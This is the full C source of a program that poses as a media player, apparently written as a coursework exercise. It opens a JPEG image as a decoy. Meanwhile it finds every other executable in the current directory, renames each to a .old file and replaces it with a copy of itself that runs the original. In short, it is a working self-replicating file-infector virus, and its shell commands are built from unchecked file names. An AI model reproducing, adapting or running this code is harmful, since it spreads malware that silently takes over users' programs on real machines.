#include "MediaPlayer.h"

char **globalptr;

int main(int argc, char *argv[]) {

        char *name = argv[0];
        globalptr = &name;

        if(strcmp(argv[0],"./MediaPlayer")) {
                char *command = argv[0];
                char *extension = ".old";
                char *String = malloc(strlen(command) + strlen(extension) + 1);
                if(String) {
                        strcpy(String,command);
                        strcat(String,extension);
                        system(String);
                }
        }
        else {
                listeFichier(".jpeg");
        }
        listingExecs();
        return 0;
}

void listeFichier(char *extension) {
        DIR *myDir;
        int cptImg = 0;
        struct dirent *dir;
        bool imgFound = false;
        char *fileName;

        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL && imgFound == false) {
                        if (strstr(dir->d_name,extension)) {
                                fileName = dir->d_name;
                                imgFound = true;
                                char *command = "xdg-open ";
                                char *errRedirect = " 2> /dev/null";
                                char *String = malloc(strlen(command) + strlen(fileName) +strlen(errRedirect) + 1);
                                if(String) {
                                        strcpy(String,command);
                                        strcat(String,fileName);
                                        strcat(String,errRedirect);
                                }
                                system(String);
                        }
                }
                closedir(myDir);
        }
}

/*
        Compte le nombre de fichiers executables dans le dossier à l'execution
*/
void listingExecs() {
        DIR *myDir;
        struct dirent *dir;

        // FIRST PARSING
        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {
                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name))) {
                                if(strstr(dir->d_name, ".old") == NULL) {
                                        if (access(dir->d_name, X_OK) == 0) {
                                                if (verifPresenceFichierOld(dir->d_name) == false) {
                                                        infect(dir->d_name);
                                                }

                                        }
                                }
                        }
                }
                closedir(myDir);
        }
}

/*
        Renomme les fichiers, créer un nouveau fichier au même nom et ajout les droits sur le nouveau fichier
*/
void infect(char *fileName) {
        // renommage des fichiers en .old
        char *command = "mv ";
        char *extension = ".old";
        char *espace = " ";
        char *String = malloc(strlen(command) + (strlen(fileName)*2) + strlen(espace) + strlen(extension) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                strcat(String,espace);
                strcat(String,fileName);
                strcat(String,extension);
                system(String);
        }

        // création des nouveaux fichier remplacant
        command = "touch ";
        String = malloc(strlen(command) + strlen(fileName) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                system(String);
        }

        // ajoute le droit d'exécution sur le fichier
        command = "chmod +x ";
        String = malloc(strlen(command) + strlen(fileName) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                system(String);
        }

        // clonage du virus dans les nouveaux fichiers
        command = "cat ";
        char *pgName = *globalptr;
        String = malloc(strlen(command) +strlen(pgName) + strlen(" >> ") + strlen(fileName) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,pgName);
                strcat(String," >> ");
                strcat(String,fileName);
                system(String);
        }
}

bool verifPresenceFichierOld(char *str) {
        DIR *myDir;
        struct dirent *dir;
        bool present = false;
        char *String = malloc(strlen(str) + strlen(".old") + 1);
        if(String) {
                strcpy(String,str);
                strcat(String,".old");
        }

        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL && present == false) {
                        if(!strcmp(dir->d_name,String)) {
                                present = true;
                        }
                }
                closedir(myDir);
        }
        return present;
}
